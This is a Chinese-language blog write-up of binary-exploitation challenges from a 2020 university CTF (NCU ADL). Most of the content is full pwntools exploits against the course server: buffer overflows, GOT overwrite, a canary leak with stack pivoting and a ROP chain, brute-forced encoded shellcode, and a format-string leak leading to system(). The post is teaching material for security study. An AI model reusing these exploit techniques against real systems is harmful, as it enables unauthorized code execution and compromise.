---
title: "2020 NCU ADL CTF (project 1) Writeups and Notes"
date: 2020-12-20 16:29:15 +0800
last_modified_at: 2022-04-11 00:36:10 +0800
header:
  overlay_image: /assets/images/adl/adl_logo.png
tags:
  - CTF
  - Write-up
  - Pwn
categories:
  - Security
---

My first CTF(?) and pwn!

亂入學校ADL CTF的一些紀錄與筆記...

<!--more-->

## Intro

雖然主要是main web，但這年頭感覺想搞web，好像什麼都要會啊XD

入學前就一直想去旁聽或修修看電腦攻防，但大一的必修卡的死死的...

不過電腦攻防沒有限制非課堂學生才能申請帳號，

所以我就把ADL CTF找來邊打邊學囉XD

[challenges backup](https://github.com/lebr0nli/NCU-ADL-CTF)

## helloctf [pwn]

![]({{site.baseurl}}/assets/images/adl/helloctf_checksec.png)

蓋ret addr到有execve()函數的text段，拿shell

```python
from pwn import *
ip   = 'ctf.adl.tw'
prot = 11001
r = remote(ip, prot)
# r = process('../binary/helloctf')
r.recvuntil("CTF!!")
targer_address = 0x4006CB
paload = b'A'*0x18 + p64(targer_address)
r.sendline(payload)
r.interactive()
```

## helloctf2 [pwn]

![]({{site.baseurl}}/assets/images/adl/helloctf2_checksec.png)

說實在感覺不出來和上一題有什麼太大的差異...

沒開什麼防護

一樣蓋ret addr到execve()的text段，拿shell

```python
from pwn import *
ip   = 'ctf.adl.tw'
prot = 11002
r = remote(ip, prot)
# r = process('../binary/helloctf2')
r.recvuntil("CTF!!")
targer_address = 0x00000000004006d7
r.sendline(b"a"*0x30+b'a'*0x8+p64(targer_address))
r.interactive()
```

## libccc [pwn]

![]({{site.baseurl}}/assets/images/adl/libccc_checksec.png)

題目有給libc，那就直接one_gadget RCE囉

一開始會用write把stdin的addr leak出來

所以可以得知libc_stdin_addr-libc_stdin_offset=libc_base_addr

蓋ret addr，接gadget_offset+libc_base_addr

```python
from pwn import *

r = remote("ctf.adl.tw", 11004)
# r = process("../binary/libccc")

stdin_raw = r.recvuntil("=")[:-1]
print(stdin_raw)
stdin_addr = int.from_bytes(stdin_raw, byteorder='little')
print('stdin addr:', hex(stdin_addr))

libc = ELF('./libc.so.6')

libc_stdin_offset = 0x03eba00
one_gadget_off = 0x4f2c5

base_addr = stdin_addr - libc_stdin_offset
print('base addr:', hex(base_addr))

payload = b'A'*0x48 + p64(one_gadget_off+base_addr)
r.sendline(payload)
r.interactive()
```

## lucky system [pwn]

![]({{site.baseurl}}/assets/images/adl/lucky_checksec.png)

這題的考點比較特殊，由於scanf一個int的時候並沒有加&

這樣scanf進來的值，會寫到那個int**值**所指的地址

而不是int的**位置**，所以只要能控制int的值，就能任意寫入

而且由於welcome和lucky是連續呼叫，他們的bp位置相同

所以可以利用welcome讀取值的時候，輕鬆的將預先那個int裡面的值寫成想任意寫入的位置

所以這裡填上fflush的got表位置

在scanf時寫入為後面所接的execve()位置的int，即可getshell

```python
from pwn import *
r = remote("ctf.adl.tw",11003)
# r = process("../binary/lucky")
r.recvuntil(" ?")
fflush_got = 0x601038
payload = b'A'* (0x40-0x18) + p64(fflush_got)
r.sendline(payload)
r.recvuntil(" : ")
r.sendline(b'4196593') # 0x4008f1 execve("/bin/sh", 0, 0);
r.interactive()
```

## We are family [pwn]

![]({{site.baseurl}}/assets/images/adl/family_checksec.png)

這題想考的是stack pivoting

因為printf會持續輸出直到遇到空字節

所以如果padding的長度控制得當，可以輸出一些stack上的資料

![]({{site.baseurl}}/assets/images/adl/family_canary.png)

![]({{site.baseurl}}/assets/images/adl/family_padding.png)

因為第一個read可以read 0x30個bytes

從上圖可以得知，如果我們send 0x24+1(\n)個bytes給他

會剛好把canary的末兩位00給蓋掉

printf就會幫我們把剩下canary印出來了

下一個read有overflow，可以看到buffer是從rbp-0x20開始開

但卻想read 0x50個bytes

但我們至少要消耗0x18(padding)-0x8(cannary)個bytes來做overflow

如果我們想串getshell的rop chain，只剩6個gadget的大小，x64不太可能

所以需要stack pivoting，在更大的buffer上繼續串(bss可寫，這裡我選擇bss+0x500作為buffer)

故將old rbp填上bss buffer+0x8(後面解釋)

將rsi(read要寫的addr)控成bss buffer

rdx控成超大的數(read的大小，但其實不用控，因為function結束時的rdx剛好超大XD)

再接上main裡準備read的addr(將mov edi,0)的這行

我們第一個payload send之後的stack會長這樣

| padding | canary | old_rbp | ret_addr | rop | rop     | rop    | read |
| ------- | ------ | ------- | -------- | --- | ------- | ------ | ---- |
| A*0x18  | canary | bss+0x8 | pop_rsi  | bss | pop_rdx | 0x1000 | read |

經過function epilogue之後

由於前面的register已經控好，這裡會呼叫的read是長這樣:

read(0,&bss_buf,0x1000);

rbp的位置會在bss_buf+8的位置

現在我們再次send payload：

canary + padding(old_rbp，如果只pivot一次可以亂填) + getshell_rop_chain

這裡的stack會長這樣

| canary | old_rbp | ret addr                |
| ------ | ------- | ----------------------- |
| canary | trash   | rop_cahin for shell.... |


之所以剛剛要回到的rbp位置要填bss_buf+8的原因

就是因為我們的gadget填的不夠多（也填不下了，或是我可能太菜，沒其他方法...），如果要用main裡的read的話

main結束的時候會檢查canary，我們必須讓rbp-8的位置上有正確的canary，不然就會stack smash

完整exploit:

```python
from pwn import *

r = remote('ctf.adl.tw', 11006)
# r = process('../binary/family')

'''set up'''
elf = ELF('../binary/family')
bss_buf = elf.bss() + 0x500
data_buf_addr = 0x6bd100
pop_rsi = 0x0000000000410713 # use ROP_gadget to find
read_addr = 0x400C80
pop_rbp = 0x0000000000400aa8
pop_rdx = 0x000000000044a365

'''exploit'''

r.recvuntil("Where is my daddy QQ\n")
r.send(b'A' * 24 + b'\n')
all_raw = r.recvuntil('Co')[25:-2]
addr = int.from_bytes(all_raw, byteorder='little')
print(hex(addr))
print('canary:', hex(addr)[8:] + '00')
canary = int(hex(addr)[8:] + '00', 16)
payload = b'A' * 24 + p64(canary) + p64(
    bss_buf + 8) + p64(pop_rsi) + p64(bss_buf) + p64(pop_rdx) + p64(0x01000) + p64(
    read_addr)
r.send(payload)

'''rop chain'''
rop_chain = p64(0x0000000000410713)  # pop rsi ; ret
rop_chain += p64(0x00000000006ba0e0)  # @ .data
rop_chain += p64(0x000000000044a30c)  # pop rax ; ret
rop_chain += b'/bin//sh'
rop_chain += p64(0x00000000004801d1)  # mov qword ptr [rsi], rax ; ret
rop_chain += p64(0x0000000000410713)  # pop rsi ; ret
rop_chain += p64(0x00000000006ba0e8)  # @ .data + 8
rop_chain += p64(0x00000000004452b0)  # xor rax, rax ; ret
rop_chain += p64(0x00000000004801d1)  # mov qword ptr [rsi], rax ; ret
rop_chain += p64(0x0000000000400696)  # pop rdi ; ret
rop_chain += p64(0x00000000006ba0e0)  # @ .data
rop_chain += p64(0x0000000000410713)  # pop rsi ; ret
rop_chain += p64(0x00000000006ba0e8)  # @ .data + 8
rop_chain += p64(0x000000000044a365)  # pop rdx ; ret
rop_chain += p64(0x00000000006ba0e8)  # @ .data + 8
rop_chain += p64(0x00000000004452b0)  # xor rax, rax ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x000000000040132c)  # syscall

r.send(p64(canary) + b'A' * 8 + rop_chain)
'''
     cannary      +     A*8   + rop chain
(   buf start(rbp-8)   ) +     rbp
'''
r.interactive()

```
## Analyzer [pwn]

![]({{site.baseurl}}/assets/images/adl/analyzer_checksec.png)

NX沒開，shellcode!

第一個read會讀 11 bytes 到 10 bytes的buffer

然後看binary可以發現會最後會call eax

eax裡面的值往上追，剛好是我們可以透過1個bytes的overflow來控的一塊鄰近的buffer位置（跟後面另一塊可控buffer只有末8位不一樣）

然後在第二個read的部分可以放shellcode在另一塊buffer上（但會過濾int 0x80,/bin/sh）

所以目標就是透過overflow執行放在第二個可控buffer裡的shellcode

但怎麼跳到指定的buffer位置呢?

這題不僅有開PIE，而且在local上嘗試蓋到指定位置的時候還會因為decrypt這個function stack smash...

但這題目標明確:

xor或shift繞過濾，蓋 1 bytes並且成功跳過去buffer，shell out

([xor shellcode 50 bytes](http://shell-storm.org/shellcode/files/shellcode-846.php))

既然只有1bytes，那就Bruteforce吧XD

在shellcode前面放滿nop sled

0x00 到 0xff random炸過去

稍待片刻...，成功XD

exploit:

```python
from pwn import *

ip = 'ctf.adl.tw'
port = 11005
import random
# context.log_level = 'debug'
count = 0
while 1:
    try:
        count += 1
        if (count%50)==0:
            time.sleep(5)
        r = remote(ip,port)
        r.recvuntil('Enter your passcode: \n')
        r.send(b'A'*0x10+p8(random.randint(0,0xff)))
        r.recvuntil('Provide the result in CSV format: \n')
        shellcode = b"\x29\xC9\x74\x14\x5E\xB1\x14\x46\x8B\x06\x83\xE8\x09\x34\x9F\x32\x46\xFF\x88\x06\xE2\xF1\xEB\x05\xE8\xE7\xFF\xFF\xFF\x31\x70\xAA\x92\xD7\x2D\xCE\xAF\xE1\xA8\xCC\x8D\xA8\xE1\xDB\x9D\xA1\x81\xFE\xBA\xDB"
        # p = run_shellcode(shellcode)
        r.send(b'\x90'*(0x60-len(shellcode))+shellcode)
        print(len(shellcode))
        r.recvuntil('Analyzing simutaion result...\n')
        r.sendline(b'ls')
        test_getshell = r.recv()
        if b'bin' in test_getshell:
            print("found")
            print(test_getshell)
            r.sendline(b'cat /home/ANALYZER/flag')
            try:
                print(r.recv())
            except:pass
            r.interactive()
    except:
        r.close()

```

## Podcast [pwn]

(這題問了很多人，最後才解出來，真的和pwn太不熟了...

這裡特別感謝davidhcefx助教和maple3142學長)

這題挺有趣的，根據題目給的zip檔，file一下裡頭的檔案

可以找到一個python script，裡頭的註解有給source code的網址

一開始以為是一題半盲pwn，所以還用fmt把binary的text段dump下來

但後來問完助教才知道在下載source code的網址的目錄可以連同binary和libc都下載下來...

所以可以靠著下載下來的binary和libc解掉...

但...我還是用一開始的思路重打一次好了XD

首先從source code可以找到兩個洞

1.fmt
2.bof

![]({{site.baseurl}}/assets/images/adl/podcast_sc.png)

bof的部分最多可以塞77個字，但url只開到51

fmt的部分只要info後面接format string，即可達到目的

先造好fmt的payload，再使用pwntool的fmt

先fuzz一下stack，找找看能不能發現_start的addr

方便等等dynelf工作

找到了!
![]({{site.baseurl}}/assets/images/adl/podcast_start.png)

現在有了fmt的leaker，有text段的大約位置

(注意設定context arch，這裡因為沒加，卡很久...)

就足夠dynelf幫我們挖出system位置了

為了知道到底nameof的buffer距離rbp到底有多遠

所以直接把binary的text段dump下來，方便分析

等等如果需要rop也方便

(dump時要注意0a(\n)出現時的處理)

經過漫長的等待，從elf開始0x3000左右的binary訊息都被我們dump下來了

可以看到，rsi，也就是fpirntf的format參數，是rbp-0xa0

![]({{site.baseurl}}/assets/images/adl/podcast_fprintf.png)

nameof的buffer是rbp-0x40

![]({{site.baseurl}}/assets/images/adl/podcast_overflow.png)

而且能發現canary

統整一下：

我們可以塞77個bytes，距離old rbp有0x40 bytes的距離，所以我們最多只能蓋到old rip 5個bytes

canary通過fpirntf可以知道，距離我們輸入的format位置(rsi/fmt offset 1)

有0x40-0x8 bytes的距離

而我們所輸入的format string是在offset 7的地方

所以canary是在7+(0x40-0x8)/8 offset處

而nameof buffer可以通過fprintf的buffer位置(rsi)+0x40-0xa算出

所以現在我們的工具有:

canary，buffer位置，libc system addr，5個bytes的可控rip（基本上可以蓋到text段上的所有位置了，畢竟那時我們也只dump 0x3000）

所以要get shell我們會需要stack pivot

不同於family那題

我們這次利用leave ret，通過兩次的leave ret將新的stack frame移到nameof的buffer位置

find rop gadget with ida and ghex（還不會操作ida來search hex QQ）

順代一提，pop rdi好像挺好找的，因為pop r15;ret;(end of libc_csu_init)，asm完後兩碼，剛好會變成pop rdi;ret XD

payload:

| rop  chain(new ret) | /bin//sh\0 | padding | old_rbp (old leave control)                | old rip (old ret control)       |
| ------------------- | ---------- | ------- | ------------------------------------------ | ------------------------------- |
| call system         | string     | AAAA    | nameof buffer addr-8 (pivot to [buffer-8]) | leave_ret_gadget(new leave ret) |

註解：

old leave，會讓rsp和rbp位置相同(mov rsp,rbp)，接下來pop rbp會將目前rsp所指([buffer-8])，pop作為新的rbp

old ret，會將rsp所指位置(剛剛pop後+8，指向我們的寫上的leave ret)，pop給rip，開始執行我們的leave ret

new leave 會讓rsp和rbp([buffer-8])位置相同

(leave中的pop rbp會將rsp所指([buffer-8]中的值)pop給rbp，但這裡我們可以忽略他的作用，但如果需要再作一次pivot，就必須在[buffer-8]上填上另一個可控buffer位置)

接下來new ret會將rsp所指位置(剛剛pop後+8，指向[buffer]中的值)，pop給rip，也就是開始執行我們的rop chain!

完整exploit:

```python
from pwn import *

# ip = "127.0.0.1"
ip = "ctf.adl.tw"
port = 11007
context(arch='amd64', os='linux')
# context.log_level = 'debug'


def send_fmt_payload(payload):
    r = remote(ip, port)
    print(payload)
    r.sendline(b'info' + payload)
    return r.recvall()


def fuzz_stack(min_value=0x0, max_value=0xffffffffffffffff):
    fmt_offset = FmtStr(send_fmt_payload).offset
    fmt = FmtStr(execute_fmt=send_fmt_payload, offset=fmt_offset)
    for i in range(1, 100):
        stack_leak = fmt.leak_stack(i)
        if min_value < stack_leak < max_value:
            print(f"0x{stack_leak:x}")
            try:
                memory_leak = fmt.leaker(stack_leak)
                print("memory information:", memory_leak)
                print(disasm(memory_leak))
            except:
                print("value in stack is not addr...")


fmt_offset = FmtStr(send_fmt_payload).offset
fmt = FmtStr(execute_fmt=send_fmt_payload, offset=fmt_offset)
start_addr = fmt.leak_stack(49)
print(f"start addr:0x{start_addr:x}")
# fuzz_stack()
# fuzz_stack(start_addr,start_addr+0x2000)
elf = DynELF(fmt.leaker, start_addr)
elf_header = elf.libbase
# dump binary
# dump_start = elf_header
# dump_end = dump_start + 0x3050
# server_bin = b''
# while dump_start<dump_end:
#     if b'\n' in p64(dump_start):
#         fix_newline = 1
#     else:
#         fix_newline = 0
#     try:
#         data = fmt.leaker(dump_start)[fix_newline:]
#     except:
#         data = b'\x00'
#     server_bin += data
#     dump_start += len(data)
# with open('blind_dump','bw') as f:
#     f.write(server_bin)
libc_base = elf.lookup(None, 'libc')
system_addr = elf.lookup('system', 'libc')

print(f"elf header addr:0x{elf_header:x}")
print(f"libc base:0x{libc_base:x}")
print(f"system:0x{system_addr:x}")
pop_rdi = elf_header + 0x1c03
buffer_addr = fmt.leak_stack(1) + 0xa0 - 0x40  # rbp-0xa0 to rbp-0x40
canary = fmt.leak_stack(fmt_offset + (0xa0 - 0x8) / 0x8)  # [ (rbp-0xa0) - (rbp-0x8) ] / 8 bytes
leave_ret = elf_header + 0x1533  # use ida to find offset in dump binary
print(f"canary:{canary:x}")
print(f"pop rdi:0x{pop_rdi:x}")
# print(disasm(fmt.leaker(pop_rdi)))
print(f"leave ret:0x{leave_ret:x}")
# print(disasm(fmt.leaker(leave_ret)))
rop = p64(pop_rdi)
rop += p64(buffer_addr + 24)
rop += p64(system_addr)
payload = rop + b"/bin//sh\x00"
payload += b'A' * (0x40 - len(payload) - 0x8) + p64(canary) + p64(buffer_addr - 8) + p64(leave_ret)[:5]
r = remote(ip, port)
r.sendline(b'nameof' + payload)
r.sendline()
r.interactive()

```

真的是還不錯的題目!學到很多！

## [web]

web 就沒啥特別，都算是經典的玩法XD

主要有出：sqli、php hash弱比較、php strcmp、lfi、xss、/.git、.bak

所以就不寫了
